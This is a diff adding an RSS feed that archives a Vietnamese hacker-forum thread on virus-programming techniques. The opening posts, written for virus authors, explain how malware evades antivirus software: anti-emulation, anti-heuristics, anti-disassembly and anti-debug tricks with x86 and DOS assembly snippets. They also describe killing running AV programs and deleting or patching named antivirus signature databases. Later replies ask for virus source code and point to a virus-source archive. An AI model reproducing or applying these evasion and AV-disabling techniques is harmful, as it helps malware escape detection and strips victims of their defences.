@@ -1,0 +1,328 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Kĩ thuật lập trình Virus - Copyright Spinx"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/28.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Kĩ thuật lập trình Virus - Copyright Spinx"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Kĩ thuật lập trình Virus - Copyright Spinx</title>
+				<description><![CDATA[ Các newbie xem cũng được nhưng bài này không dành cho newbie. Đây không phải khái niêm cơ bản, tôi chỉ muốn tổng kết một số kỹ thuật bảo vệ trong môn virus programming
+
+Một chương trình diệt VR (AV) tốt là một AV tìm được nhiều VR. Một VR mạnh là một VR được bảo vệ. Được bảo vệ có nghĩa là VR có các tính năng chống phát hiện, chống emulate, chống disassemble, khó theo dõi hành vi. Ở đây tôi xin đề cập đến một vài kỹ thuật bảo vệ như vậy đã từng được các V-er áp dụng trong virus programming. 
+Có nhiều cách lắm và rất đa dạng như bất cứ kỹ thuật nào cần đến sức sáng tạo của con người. Trong phần này tôi sẽ đề cập tới các kỹ thuật chính:
+- anti-emulator 
+- anti-heuristics 
+- anti-analysis (anti-disasm) 
+- anti-debug 
+- anti-monitor 
+- anti-antivirus (retro) 
+- anti-bait 
+Đây là giới thiệu chung nên tôi không đưa hết các code ví dụ. Có thể tôi sẽ phân tích và đưa ra code ví dụ sâu hơn ở từng kỹ thuật nếu thấy có nhiều bạn đọc quan tâm. Nếu bạn nào muốn thảo luận sâu hơn về kỹ thuật nào xin liên hệ trực tiếp.
+
+Anti-Emulator bằng các tip-trick đơn giản:
+Với phương pháp heuristic analysis các AV sẽ CÓ THỂ phát hiện ra mọi VR, kể cả các VR chưa từng gặp. Nó làm việc giống như một bộ giải mã, quét và kiểm tra các đoạn code khả nghi kiểu như các đoạn duyệt APIs, jump to ring-0, làm việc với *.exe mở và ghi các tệp khả thi (.exe, .dll...). Heuristic analysis là một í tưởng rất táo bạo tuy nhiên nghe có vẻ ... phi thực tế. Thế nhưng kỹ thuật này cho đến nay đã có rất nhiều cải tiến và phát triển trong hầu hết các AV nổi tiếng. Tuy vậy, nhiều AV có các bugs và nhiều khi không nhận các đoạn code nguy hiểm. Một số gặp khó khăn khi bắt gặp các mã lệnh "hiểm" (undocumented opcodes) và đa số chúng đều không thể quản lý stack chính các như khi VR chạy thực. Lợi dụng các đặc điểm này nảy sinh một số tricks để qua mặt các Emulator như:
+- Kiểm tra stack:
+mov edx, esp 
+push cs 
+pop eax 
+cmp esp, edx 
+jne emul_present ; Có AV emulator
+Đoạn code trên hoàn toàn vô hại thậm chí hơi ngớ ngẩn nếu bạn xem qua nhưng trong thực tế chương trình của ban phát hiện được ngay có kẻ can thiệp vào stack của ban trong khi chạy, vậy chương trình của bạn không chạy thực mà chỉ đang trong chế độ emulator  
+- Tương tự thế bạn có thể lừa AV bằng vài lệnh RETF (rất nhiều VR nội có dùng)
+- Sử dụng các opcode lạ (undocumented opcodes) của processor như SALC, BPICE. Vô hại với bạn nhưng khó hiểu với AV
+......
+
+Anti-Heuristics bằng kỹ thuật cao cấp:
+Như vậy anti-emulator là đánh vào chỗ hổng của các giải thuật heuristic scanners. Các AV có thể khắc phục nhưng rất khó khăn đặc biệt nếu bạn dùng vài kỹ thuật cao hơn như SEH. Tạo ra lỗi giả rồi nhảy đến đoạn bẫy lỗi. Tôi viết VR cách đây lâu rồi nên các kỹ thuậu mới trên win có khi không cập nhật bằng các bác nữa. Tôi sẽ đi sâu vào DOS hơn một chút.
+Trước kia trên DOS tôi thích sử dụng vài kỹ thuật bẫy ngắt với:
+- Int 0 (divide by zero). Chỉ cần một phép chia cho 0, bạn sẽ nhảy ngay đến code mới mà emulator không theo vết được (ta có thể âm thầm descrypt ở đây)
+- Dấu code gọi ngắt:
+mov ax, 3D02h-key
+add ax, key
+int 21h ;Tránh để lộ thao tác đọc file
+- Với 386/486 ngày xưa có thể cùng queue fetch (xin lỗi vì tôi hơi hoài cổ một chút):
+mov word ptr cs:[offset piq], 20CDh
+piq:
+nop
+nop
+code này ngày nay không dùng được. Bạn sẽ nghĩ chương trình sẽ kết thúc vì lệnh int 20h (20CDh) ư? Không đâu! với 386/486 code chạy vẫn là nop  
+Thế nhưng ngày nay kỹ thuật này biến thể một chút vì các CPU pentium không có queue fetch nhưng các emulator phát triển từ xưa vẫn nghĩ là có. Kỹ thuật đảo lại là:
+mov word ptr [offset prefetch], <mã lệnh jump>
+prefetch:
+int 20h
+(sao bạn không cười? tôi có trình khó hiểu quá không nhỉ?  )
+- Tương tự ngắt int 0. Bạn có thể bẫy int 1, int 6
+Thôi kết thúc DOS. Trở lại win ta có thể dùng:
+- Structured Exception Handling (SEH). Kỹ thuật này phổ biến quá rồi ha
+- Threads and fibers 
+- Pentium+, copro, MMX, 3DNow! opcodes (undocumented opcodes)
+- Kỹ thuật đa hình metamorphism
+- Nhảy bằng Callbacks
+- .......
+Chắc mọi người biết cả rồi vì tôi mới trở lại với "Nghệ thuật hắc ám" gần nên kiến thức trên win không mới lắm.
+
+Anti-Analysis
+Ở phần này tôi muốn nói về chống disassemblers. Ai cũng biết mấy thằng disassemblers thông dụng như IDA, Sourcer hay win32dasm. Nếu bạn là người xây dựng chương trình disassemblers bạn sẽ làm thể nào. Tất nhiên dễ nhất là bắt đầu từ đầu chương trình, dasm tuần tự. Nếu code tuần tự như tiến ta có kết quả đẹp nhất. Nếu không sau lần chạy thứ nhất ta sẽ hiệu chỉnh lại code theo các lệnh nhảy và call... Thử chạy sourcer, bạn sẽ thấy điểm yếu nhất của disassemblers là rất, rất khó xử lý lệnh call và jump. Vậy phương pháp của V-er là:
+- Mã hoá càng nhiều càng tốt
+- Sử dụng call với relative offset kiểu
+call label
+gdelta: db 0b8h ;MOV opcode
+label: pop ebp 
+... 
+mov eax, [ebp + variable - gdelta]
+(Cách này có ở đa số VR rồi)
+- Nhảy vào ... giữa mã lệnh:
+jmp opcd+1 ;jump into instruction
+opcd: mov eax, 0fcebfa90h
+Bạn có thể thấy ngay thực ra đây không phải lệnh mov mà lệnh ta là 0fcebfa90h cơ
+- Chèn các mã kiểu (db 0b8h) vào nhiều nơi sau các lệnh ret, jmp, ...
+- Patch code runtime (tương tự kiểu queue fetch ở trên
+- ...
+
+Anti-Debug
+Các AVer đã tóm được một mẫu VR của bạn. Hix.. bây giờ thì quá khó. Tuy vậy ta cũng có thể chống đỡ trong ... tuyệt vọng. Với Anti-Debug, nếu AVer không cao thủ họ mới nghi ngờ thôi thì cũng có thể bỏ cuộc. Vả lại có chết cũng cho oanh liệt, gây khó khăn chứ. Nếu không disassemble được người diệt sẽ debug. Cách thông thường là tìm xem có phần mềm debugger thông dụng kiểu softice thì chuồn lẹ. Các cách nhận biết debugger có thể là:
+- Gọi luôn API của debugger
+- Kiểm tra debugger context
+- Sử dụng SEH (xem trên)
+- Gọi VxD service (Ring-0 only)
+- Kiểm tra softice trên bộ nhớ bằng CreateFileA 
+- Chọc vào các thanh ghi debug (Ring-0 only) 
+
+Anti-Monitor
+Cũng vậy thôi, ta tìm xem có thằng AV nào thông dụng đang chạy trên bộ nhớ thì chuồn. Có thể dùng hàm API FindWindowA mà tìm. Nếu thấy thịt nó luôn bằng cách sử PostMessageA đến window handle của nó
+
+Anti-Antivirus
+Chủ động tìm database của AV trên đĩa mà thịt (có thể AV sẽ không chạy được nữa). Hay nhất là patch được database (AV chạy bình thường nhưng không tìm được VR nữa. Một số db thông dụng:
+*.AVC - AVP viral database
+AVP.CRC - AVP crc file
+*.VDB - DrWeb viral database
+NOD32.000 - NODICE viral database
+ANTI-VIR.DAT - TBAV crc file
+CHKLIST.MS - MSAV crc file
+
+Anti-Bait
+Chọn file mà lây. Tránh các AV, tránh mấy chương trình thông dụng kiểu winword.exe. Như ngày xưa trên DOS ta hay tránh command.com í
+
+Tóm lại, tôi tổng kết các kỹ thuật ở đây, đây là theo những gì tôi hiểu nên sai các bác bỏ qua cho. Nếu tôi trình bày khó hiểu quá thì hix... trình độ sư phạm tôi thế thôi. Đây toàn là í tưởng các Ver chuyên nghiệp đã dùng nếu bạn là Ver đã từng viết VR chắc sẽ hiểu ra và tự xây dựng đoạn code cho riêng mình được.
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/390.hva#937</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/390.hva#937</link>
+				<pubDate><![CDATA[Sun, 25 Jun 2006 23:48:37]]> GMT</pubDate>
+				<author><![CDATA[ BigballVN]]></author>
+			</item>
+			<item>
+				<title>Re: Kĩ thuật lập trình Virus - Copyright Spinx</title>
+				<description><![CDATA[ Tôi sẽ đưa thêm một số ví dụ về từng kỹ thuật đã đề cập phía trên
+
+Anti-Debug
+Về bản chất chống thao tác debug tức là dạy VR chống lại con người (ở đây là các AV), chính vì vậy điều này xem ra không thể thực hiện được. Sau khi bắt được một mẫu VR mà không de-assemble được, các AV sẽ sử dụng các công cụ debug dịch ngược VR từ mã máy ra dạng ASM để đọc và tìm hiểu nguyên lý hoạt động của VR đặc biệt là đoạn code mã hoá vì đây là điểm quan trọng nhất để giải mã và hiểu được nội dung VR. Thông thường đề làm được các VXer phải mã hoá VR dựa trên một số thuật toán mã hoá thật phức tạp nhằm làm nản lòng người đọc. Các giải thuật này có rất nhiều trên NET nên tôi sẽ không trình bày nữa. Khi lập trình người lập nên tận dụng các lệnh nhảy và call càng nhiều càng tốt nhằm gây khó khăn cho người theo dõi.
+
+- Gọi luôn API của debugger
+VD:
+call IsDebuggerPresent ;call API
+xchg eax, ecx ;result to ECX
+jecxz debugger_not_present ;if ZERO, debugger not present
+Gọi hàm API Win98/NT kiểm tra API level debugger 
+
+- Kiểm tra debugger context
+mov ecx, fs:[20h] ;load context of debugger
+jecxz debugger_not_present ;if ZERO, debugger not present
+- Sử dụng SEH 
+call setupSEH ; The call pushes the offset
+errorhandler:
+mov esp,[esp+8] ; Put the original SEH offset
+; Error gives us old ESP
+; in [ESP+8]
+;*** SECRET CODE HERE ***
+setupSEH:
+push dword ptr fs:[0] ; Push original SEH handler
+mov fs:[0],esp ; And put the new one (located
+; after the first call)
+
+mov ebx,0BFF70000h ; Try to write in kernel (will
+mov eax,012345678h ; generate an exception)
+xchg eax,[ebx]
+
+- Gọi VxD service (Ring-0 only)
+mov eax, 202h ;SoftICE ID number
+VxDCall Get_DDB ;call service
+xchg eax, ecx ;result to ECX
+jecxz sice_not_present ;SoftICE not present
+
+- Kiểm tra softice trên bộ nhớ bằng CreateFileA 
+xor eax, eax ;EAX=0
+push eax ;parameters
+push 4000000h ;for
+push eax ;CreateFileA
+push eax ;API
+push eax ;function
+push eax ;...
+push offset sice ;name of driver
+call CreateFileA ;open driver
+inc eax ;is EAX==0?
+je sice_not_present ;yeah, SoftICE is not present
+dec eax ;no,
+push eax ;close its handle
+call CloseHandle ;...
+... ;and make some action
+sice db '\\.\SICE',0 ;SICE driver under Win9X
+;sice db '\\.\NTICE',0 ;SICE driver under WinNT
+- Chọc vào các thanh ghi debug (Ring-0 only) 
+mov eax, '****' ;set already_infected mark
+mov dr0, eax ;to dr0
+
+Anti-Heuristics bằng bẫy ngắt trên DOS:
+
+INT 1: Ngắt 01 có một số đặc điểm lạ có thể lợi dụng. Thông thường ta có thể gọi ngắt qua opcode CDh. Ở đây là 0CDh/001h tuy nhiên lệnh gọi ngắt 01 có một mã khác là 0F1h. Mã không công bố cũng đồng nghĩa với việc có thể không được emulated bởi các AVs. Lợi dụng điều này ta có thể dùng INT 01h để mã hoá VR:
+
+mov ax, 3501h ;Lấy ngắt 01 cũ
+int 21h 
+mov old_segm, es
+mov old_offs, bx
+
+mov ax, 2501h ; Bẫy int 01
+mov dx, offset int1_handler ;Giả định DS=CS
+int 21h
+
+db 0F1h ;  Giải mã VR
+
+mov ax, 2501h ;Phục hồi ngắt cũ
+mov dx, cs:old_offs
+mov ds, cs:old_segm
+int 21h
+
+
+[...]
+
+int1_handler:
+;...Giải mã/ mã hoá VR here...
+iret
+
+Hoặc ta có thể làm mất vết bằng cách:
+[...]
+
+db 0F1h ;Gọi int 01 đã bẫy (như trên)
+mov ax, 4c00h ;quit program  
+int 21h ;Thực ra chẳng bao giờ quit
+
+;---- VR tiếp tục bình thường
+
+[...]
+
+int1_handler:
+mov bx, sp ;modify return address, so the quit command
+add word ptr ss:[bx], 5 ;is never executed.
+iret
+
+INT 06: Điểm mạnh của INT 06 là được CPU gọi khi có thao tác bất thường. Các AVs rất khó bẫy. Tương tự trên ta ó thể sử dụng int 06h
+
+mov ax, 3506h ;Lấy ngắt cũ
+int 21h 
+mov old_segm, es
+mov old_offs, bx
+
+mov ax, 2506h ;Bẫy ngắt
+mov dx, offset int6_handler
+int 21h
+
+dw 0FFFFh ;Tự tạo lỗi
+
+mov ax, 2506h ;trả ngắt cũ
+mov dx, cs:old_offs
+mov ds, cs:old_segm
+int 21h
+
+[...]
+
+int6_handler:
+;mã hoã/giải mã ở đây
+mov bx, sp
+add word ptr ss:[bx], 2 ;Trở về VR cũ
+;2 là mã lệnh không hợp lệ
+iret
+
+Hoặc cũng có thể dùng làm kỹ thuật xoá vết như trên
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/390.hva#938</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/390.hva#938</link>
+				<pubDate><![CDATA[Sun, 25 Jun 2006 23:49:35]]> GMT</pubDate>
+				<author><![CDATA[ BigballVN]]></author>
+			</item>
+			<item>
+				<title>Re: Kĩ thuật lập trình Virus - Copyright Spinx</title>
+				<description><![CDATA[ cái này em đọc trong quển hướng dẫn diệt virus rồi,trình bày các công nghệ như tạo áo giáp ,lây lan,còn có 1 số code của các virus CIH nữa]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/390.hva#69936</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/390.hva#69936</link>
+				<pubDate><![CDATA[Sun, 8 Jul 2007 18:53:44]]> GMT</pubDate>
+				<author><![CDATA[ vippro123]]></author>
+			</item>
+			<item>
+				<title>Kĩ thuật lập trình Virus - Copyright Spinx</title>
+				<description><![CDATA[ Hey ! bạn muốn ám chỉ là việc viết virus bằng ASM32 sao. Nghe có vẻ hơi rối rắm và khó hiểu cho các "NHÂN" nhỉ. Bạn có thể diển đạt nó bằng các ngôn ngử khác dược không.
+
+Uhm ! y minh la các ngôn ngử bậc cao (&lt;&lt;Viết Virus dể hơn mà). Chứ viết bằng ASM32 thì phần lớn là lấy source từ các nguồn trên NET rùi sửa đổi theo ý mình. Nhưn ASM thì dễ viết khó sửa mà. Có lẽ một bài mang tính phổ thông sẽ tốt hơm.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/390.hva#70500</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/390.hva#70500</link>
+				<pubDate><![CDATA[Wed, 11 Jul 2007 10:58:38]]> GMT</pubDate>
+				<author><![CDATA[ cpu_133mhz]]></author>
+			</item>
+			<item>
+				<title>Kĩ thuật lập trình Virus - Copyright Spinx</title>
+				<description><![CDATA[ <blockquote>Hey ! bạn muốn ám chỉ là việc viết virus bằng ASM32 sao. Nghe có vẻ hơi rối rắm và khó hiểu cho các &quot;NHÂN&quot; nhỉ. Bạn có thể diển đạt nó bằng các ngôn ngử khác dược không.
+
+Uhm ! y minh la các ngôn ngử bậc cao (&lt;&lt;Viết Virus dể hơn mà). Chứ viết bằng ASM32 thì phần lớn là lấy source từ các nguồn trên NET rùi sửa đổi theo ý mình. Nhưn ASM thì dễ viết khó sửa mà. Có lẽ một bài mang tính phổ thông sẽ tốt hơm.
+&nbsp;
+		</blockquote>
+Học những thứ phổ thông, làm những thứ phổ thông và bạn sẽ có trình độ rất phổ thông :). 
+
+Bài viết hay lắm ^^! các bạn nên tập trung thảo luận, hơn là hỏi xem nên dùng ngôn ngử nào. ASM dùng trong việc viết virus có rất nhiều điểm mạnh. Còn một điều nữa, đừng trông chờ vào những ngôn ngử cấp cao, chúng sẽ làm chúng ta lú lẫn. Ngôn ngử lập trình càng đơn giản, càng dễ sữ dụng và phổ thông thì sản phẩm làm ra sẽ có hạn chế của nó.&gt;]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/390.hva#219062</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/390.hva#219062</link>
+				<pubDate><![CDATA[Tue, 24 Aug 2010 12:53:55]]> GMT</pubDate>
+				<author><![CDATA[ san.chrio]]></author>
+			</item>
+			<item>
+				<title>Kĩ thuật lập trình Virus - Copyright Spinx</title>
+				<description><![CDATA[ Em chào mọi người.
+Hiện tại em đang nghiên cứu về đề tài Antivirus
+Bước đầu em nghiên cứu đề viết ra virus.
+Các anh cho em xin mã con virus viết bằng c++ với
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/390.hva#223443</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/390.hva#223443</link>
+				<pubDate><![CDATA[Fri, 22 Oct 2010 12:59:27]]> GMT</pubDate>
+				<author><![CDATA[ anhndhp]]></author>
+			</item>
+			<item>
+				<title>Kĩ thuật lập trình Virus - Copyright Spinx</title>
+				<description><![CDATA[ vius có thể viết bằng java không mấy anh?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/390.hva#223449</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/390.hva#223449</link>
+				<pubDate><![CDATA[Fri, 22 Oct 2010 19:43:14]]> GMT</pubDate>
+				<author><![CDATA[ betri28]]></author>
+			</item>
+			<item>
+				<title>Kĩ thuật lập trình Virus - Copyright Spinx</title>
+				<description><![CDATA[ Có mẫu virus nào bằng ngôn ngữ lập trình hiện đại ko mấy bác?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/390.hva#280402</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/390.hva#280402</link>
+				<pubDate><![CDATA[Sun, 20 Apr 2014 22:45:50]]> GMT</pubDate>
+				<author><![CDATA[ mkchen]]></author>
+			</item>
+			<item>
+				<title>Kĩ thuật lập trình Virus - Copyright Spinx</title>
+				<description><![CDATA[ http://vxheavens.com/
+
+Thiên đường của virus, nơi chứa mã nguồn, hướng dẫn lập trình, các kĩ thuật lập trình virus, etc ...
+
+bạn nào có hứng thì qua đó vọc :D
+
+ps: PR hơi quá tay ...]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/390.hva#280486</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/390.hva#280486</link>
+				<pubDate><![CDATA[Sun, 27 Apr 2014 11:54:45]]> GMT</pubDate>
+				<author><![CDATA[ congchuahoatuyet1997]]></author>
+			</item>
+	</channel>
+</rss>
